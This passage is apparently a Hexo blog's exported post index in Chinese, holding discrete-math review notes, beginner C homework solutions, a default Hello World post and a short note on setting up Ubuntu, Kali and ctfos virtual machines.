<li><strong>欧拉通路</strong>：恰两顶点度奇 →
<strong>存在通路</strong></li>
<li><strong>偶图</strong>：无奇圈（充要条件）</li>
<li><strong>哈密顿图</strong>：必要条件（删k顶点后≤k连通分量）；充分条件（Dirac定理：<code>δ(G)≥n/2</code>）</li>
<li><strong>平面图</strong>：必要条件（<code>e≤3v-6</code>）；充要条件（Kuratowski定理：不含K₅/K₃,₃细分）</li>
</ul></li>
<li><strong>矩阵表示</strong>
<ul>
<li>邻接矩阵A的k次幂：<code>Aᵏ[i][j]</code> = i到j长度为k的路径数</li>
<li>应用：计算结点间通路数量</li>
</ul></li>
</ol>
<hr />
<h3 id="五复习策略"><strong>五、复习策略</strong></h3>
<ol type="1">
<li><strong>优先级排序</strong>：
<ul>
<li>命题逻辑（范式/证明） &gt; 二元关系（性质/偏序） &gt;
图论（特殊图判定） &gt; 谓词逻辑（证明）</li>
</ul></li>
<li><strong>应试技巧</strong>：
<ul>
<li>哈斯图元素判定：画图后分层观察</li>
<li>范式计算：真值表法最可靠</li>
<li>闭包运算：传递闭包用<code>t(R)=R⁺</code>（Warshall算法）</li>
</ul></li>
<li><strong>高频错题</strong>：
<ul>
<li>反对称性 vs 反自反性</li>
<li>极大元 vs 最大元</li>
<li><code>∀x∃y</code> 与 <code>∃y∀x</code> 的语义差异</li>
</ul></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>编程作业2</title>
    <url>/2024/11/04/%E7%BC%96%E7%A8%8B%E4%BD%9C%E4%B8%9A2/</url>
    <content><![CDATA[<h2 id="程序文件名zy-1.cpp">1、【程序文件名】zy-1.cpp</h2>
<p>【题目描述】编写一个程序，功能是：输入两个整数，变量值交换后输出，输出时两个整数间用一个空格隔开。如输入：12
34，则输出：34 12</p>
<span id="more"></span>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num1, num2, temp;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;num1, &amp;num2);</span><br><span class="line">    temp = num1; </span><br><span class="line">    num1 = num2; </span><br><span class="line">    num2 = temp; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>, num1, num2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy-2.cpp">2、【程序文件名】zy-2.cpp</h2>
<p>【题目描述】编写一个程序，功能是：求 <span
class="math display">√(|<em>x</em><sup>3</sup> − 5|)/(<em>e</em><sup><em>x</em></sup> + 3)。</span>
。其中，x为浮点数，由键盘输入。计算后输出y的值（显示两位小数)。如输入：3.5，则输出：0.17，输入：-1.2，则输出：0.79。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">float</span> x, y;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>, &amp;x);</span><br><span class="line">    y = <span class="built_in">sqrt</span>(<span class="built_in">fabs</span>(<span class="built_in">pow</span>(x, <span class="number">3</span>) - <span class="number">5</span>)) / (<span class="built_in">exp</span>(x) + <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2f&quot;</span>, y);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="程序文件名zy-3.cpp">3、【程序文件名】zy-3.cpp</h3>
<p>【题目描述】编写一个程序，功能是：输入一个年份，判断它是否为闰年。其中，闰年的年份满足以下两个条件之一：一是能被400整除；二是能被4整除，但不能被100整除。如输入：2024，则输出：Y；输入：2022，输出：N。</p>
<p>要求：使用条件运算符，不使用if语句。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> year;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;year);</span><br><span class="line">    <span class="type">char</span> isLeapYear = (year % <span class="number">400</span> == <span class="number">0</span> || (year % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; year % <span class="number">100</span> != <span class="number">0</span>)) ? <span class="string">&#x27;Y&#x27;</span> : <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, isLeapYear);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>编程作业3</title>
    <url>/2024/11/04/%E7%BC%96%E7%A8%8B%E4%BD%9C%E4%B8%9A3/</url>
    <content><![CDATA[<h2 id="程序文件名zy2-1.cpp">1、【程序文件名】zy2-1.cpp</h2>
<p>【题目描述】编写一程序，功能是：输入一个百分制成绩（正整数），输出成绩等级A、B、C、D、E。其中90分以上为A、80<sub>89为B、70</sub>79为C、60~69为D、小于60分为E。用if语句实现。例如：输入：90，输出：A；输入68，输出：D；输出15，输出：E。</p>
<span id="more"></span>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score);</span><br><span class="line">    <span class="keyword">if</span> (score &gt;= <span class="number">90</span> &amp;&amp; score &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;D&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;E&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy2-2.cpp">2、【程序文件名】zy2-2.cpp</h2>
<p>【题目描述】编写一程序，功能是：输入一个百分制成绩（正整数），输出成绩等级A、B、C、D、E。其中90分以上为A、80<sub>89为B、70</sub>79为C、60~69为D、小于60分为E。用switch语句实现。例如：输入：90，输出：A；输入68，输出：D；输出15，输出：E。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score);</span><br><span class="line">    <span class="type">char</span> grade;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (score / <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            grade = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            grade = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            grade = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            grade = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            grade = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, grade);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy2-3.cpp">3、【程序文件名】zy2-3.cpp</h2>
<p>【题目描述】编写一程序，功能是：输入4个整数，要求按从小到大的顺序输出这4个数。（输出数据以1个空格隔开）。注：不能使用数组。例如：输入：3
1 6 4，输出：1 3 4 6；输入：67 100 31 67，输出：31 67 67 100。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main() &#123;</span><br><span class="line">    <span class="keyword">int</span> a, b, c, d;</span><br><span class="line">    scanf(<span class="string">&quot;<span class="variable">%d</span> <span class="variable">%d</span> <span class="variable">%d</span> <span class="variable">%d</span>&quot;</span>, &amp;a, &amp;b, &amp;c, &amp;d);</span><br><span class="line">    <span class="keyword">if</span> (a &gt; b) &#123; </span><br><span class="line">	<span class="keyword">int</span> temp = a; a = b; b = temp; </span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">if</span> (a &gt; c) &#123; </span><br><span class="line">	<span class="keyword">int</span> temp = a; a = c; c = temp; </span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">if</span> (a &gt; d) &#123; </span><br><span class="line">	<span class="keyword">int</span> temp = a; a = d; d = temp; </span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">if</span> (b &gt; c) &#123; </span><br><span class="line">	<span class="keyword">int</span> temp = b; b = c; c = temp; </span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">if</span> (b &gt; d) &#123;</span><br><span class="line">	 <span class="keyword">int</span> temp = b; b = d; d = temp; </span><br><span class="line">	 &#125;</span><br><span class="line">    <span class="keyword">if</span> (c &gt; d) &#123; </span><br><span class="line">	<span class="keyword">int</span> temp = c; c = d; d = temp; </span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">printf</span>(<span class="string">&quot;<span class="variable">%d</span> <span class="variable">%d</span> <span class="variable">%d</span> <span class="variable">%d</span>&quot;</span>, a, b, c, d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy2-4.cpp">4、【程序文件名】zy2-4.cpp</h2>
<p>【题目描述】编写一程序，功能是：求1~n中所有偶数之和，其中，n由键盘输入。例如：输入：10，输出：30；输入：50，输出：650；输入：100，输出：2550。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i += <span class="number">2</span>) &#123;</span><br><span class="line">        sum += i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>整数溢出</title>
    <url>/2024/11/04/%E7%BC%96%E7%A8%8B%E4%BD%9C%E4%B8%9A1/</url>
    <content><![CDATA[
]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/09/08/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very
first post. Check <a href="https://hexo.io/docs/">documentation</a> for
more info. If you get any problems when using Hexo, you can find the
answer in <a
href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or
you can ask me on <a
href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="quick-start">Quick Start</h2>
<h3 id="create-a-new-post">Create a new post</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a
href="https://hexo.io/docs/writing.html">Writing</a></p>
<span id="more"></span>
<h3 id="run-server">Run server</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="generate-static-files">Generate static files</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a
href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="deploy-to-remote-sites">Deploy to remote sites</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a
href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>虚拟机</title>
    <url>/2024/10/12/%E9%A6%96%E9%A1%B5/</url>
    <content><![CDATA[<h1 id="虚拟机的搭建">虚拟机的搭建</h1>
<span id="more"></span>
<h2 id="一准备软件">一、准备软件</h2>
<p>VMware，ubuntu，kali，ctfos（B站看到了就随手搞了）</p>
<h2 id="二搭建过程">二、搭建过程</h2>
<p>1.下载对应软件及系统iso文件</p>
<p>2.新建虚拟机，按照引导进行配置，分盘，安装</p>
<p>3.拍摄快照，便于以后可以遇到问题不用重装系统（省内存哈哈哈）</p>
<h4 id="ctfos">ctfos</h4>
<p>ctfos的安装小有不同，只需要直接打开.ovf文件即可</p>
<h2 id="三搭建结果">三、搭建结果</h2>
<p><img
src="https://p.sda1.dev/19/109c3dac1c57f5c749dd011c95c8f8b1/kali.png" /></p>
<p><img
src="https://p.sda1.dev/19/9ac69690bc530b9566822a120b9d490c/ctfos.png" /></p>
<p><img
src="https://p.sda1.dev/19/3b52bc0bd23513b9e5d3fbb14371c70e/ub.png" /></p>
]]></content>
  </entry>
  <entry>
    <title>编程作业汇总</title>
    <url>/2024/11/05/%E7%BC%96%E7%A8%8B%E4%BD%9C%E4%B8%9A%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<p>24.11.5后均在此更新，ctrl+f可以直接搜索</p>
<span id="more"></span>
<h1 id="编程作业424.11.5">编程作业4（24.11.5）</h1>
<h2 id="程序文件名zy3-1.cpp">1、【程序文件名】zy3-1.cpp</h2>
<p>【题目描述】编写一程序，功能是：从键盘输入一个小于1000的正数，输出它的自然对数（小数保留2位）。要求在输入数据后先对其进行检查是否为小于1000的正数。若不是，则重新输入，直到输入符合要求为止。例如：输入：99，输出：4.60；输入：555，输出：6.32；输入：999，输出：6.91。注：math.h头文件中的自然对数函数log。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> num;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;num);</span><br><span class="line">        <span class="keyword">if</span> (num &lt;= <span class="number">0</span> || num &gt;= <span class="number">1000</span>) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (num &lt;= <span class="number">0</span> || num &gt;= <span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>, <span class="built_in">log</span>(num));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy3-2.cpp">2、【程序文件名】zy3-2.cpp</h2>
<p>【题目描述】编程一程序，功能是：求1到n之间能同时被3和7整除的整数之和。其中，n由键盘输入。例如：输入：100，输出：210；输入：500，输出：5796；输入：1000，输出：23688。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">21</span>; i &lt;= n; i += <span class="number">21</span>) &#123;</span><br><span class="line">        sum += i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy3-3.cpp">3、【程序文件名】zy3-3.cpp</h2>
<p>【题目描述】编程一程序，功能是：求1!+2!+3!+…+n!的值。其中，n由键盘输入。例如：输入：3，输出：9；输入：5，输出：153；输入：8，输出：46233。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> f = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        f*= i;</span><br><span class="line">        sum += f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>, sum);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="编程作业524.11.8">编程作业5（24.11.8）</h1>
<h2 id="程序文件名zy4-1.cpp">1、【程序文件名】zy4-1.cpp</h2>
<p>【题目描述】编写一程序，功能是：输出所有的“水仙花数”，数间用一个空格隔开。所谓“水仙花数”是指一个3位数，其各位数字立方和等于该数本身，例如，153是“水仙花数”，因为153=1<sup>3+5</sup>3+3^3。</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">    <span class="built_in">int</span> <span class="built_in">num</span>, a, b, c;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">num</span> = <span class="number">100</span>; <span class="built_in">num</span> &lt;= <span class="number">999</span>; <span class="built_in">num</span>++) &#123;</span><br><span class="line">        a = <span class="built_in">num</span> / <span class="number">100</span>;        </span><br><span class="line">        b = (<span class="built_in">num</span> / <span class="number">10</span>) % <span class="number">10</span>;  </span><br><span class="line">        c = <span class="built_in">num</span> % <span class="number">10</span>; </span><br><span class="line">        <span class="keyword">if</span> (a*a*a + b*b*b + c*c*c == <span class="built_in">num</span>) &#123;</span><br><span class="line">            printf(<span class="string">&quot;%d &quot;</span>, <span class="built_in">num</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy4-2.cpp">2、【程序文件名】zy4-2.cpp</h2>
<p>【题目描述】编程一程序，功能是：输出如下图形。其中，行数n由键盘输入。例如：</p>
<p>输入：5</p>
<p>输出：</p>
<p>A</p>
<p>BAB</p>
<p>CBABC</p>
<p>DCBABCD</p>
<p>EDCBABCDE</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="string">&#x27;A&#x27;</span> + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="string">&#x27;A&#x27;</span> + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy4-3.cpp">3、【程序文件名】zy4-3.cpp</h2>
<p>【题目描述】编写一程序，功能是：输入n个数，输出它们的平均值（小数保留1位）。其中n由键盘输入。注：不能用数组。下列输入的第一个数为数据的个数，即n的值。</p>
<p>例如：输入：5 1 2 3 4 5，输出：3.0，输入：3 5 5 6，输出：5.3。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">double</span> sum = <span class="number">0.0</span>, num;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;num);</span><br><span class="line">        sum += num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.1f\n&quot;</span>, sum / n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="实验课224.11.11">实验课2（24.11.11）</h1>
<h2 id="sy2-1">1.sy2-1</h2>
<p>打开C集成开发环境，建立一个sy2-1.cpp文件，编写程序，计算以下分段函数：</p>
<p>​</p>
<p>从键盘上输入x的值，计算并输出y的值（保留3位小数）。运行程序，输入x的值（分别为x&lt;1、1≤x&lt;10、x≥10这3种情况，检查输出的y值是否正确。例如：</p>
<p>输入：-1.23，输出：7.540</p>
<p>输入：5.7，输出：102.470</p>
<p>输入：15，输出：8.832</p>
<figure class="highlight gml"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    double <span class="variable language_">x</span>, <span class="variable language_">y</span>;</span><br><span class="line">    scanf(<span class="string">&quot;%lf&quot;</span>, &amp;<span class="variable language_">x</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">x</span> &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable language_">y</span> = <span class="number">2</span> * <span class="variable language_">x</span> + <span class="number">10</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">x</span> &gt;= <span class="number">1</span> &amp;&amp; <span class="variable language_">x</span> &lt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="variable language_">y</span> = <span class="number">3</span> * <span class="variable language_">x</span> * <span class="variable language_">x</span> + <span class="number">5</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">y</span> = <span class="built_in">sqrt</span>(<span class="number">5</span> * <span class="variable language_">x</span> + <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(<span class="string">&quot;%.3f\n&quot;</span>, <span class="variable language_">y</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sy2-2">2.sy2-2</h2>
<p>打开C集成开发环境，建立一个sy2-2.cpp文件，编写程序，功能是给出一个百分制成绩，要求输出成绩等级A，B，C，D，E。90<sub>100分为A，80</sub>89分为B，70～79分为C，60～69分为D，60分以下为E。若输入0~100以外的数据，输出X。运行程序，输入数据并检查结果是否正确。例如：</p>
<p>输入：200，输出：X</p>
<p>输入：100，输出：A</p>
<p>输入：59，输出：E</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score);</span><br><span class="line">    <span class="keyword">if</span> (score &lt; <span class="number">0</span> || score &gt; <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;X\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (score / <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;A\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;B\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;C\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;D\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;E\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    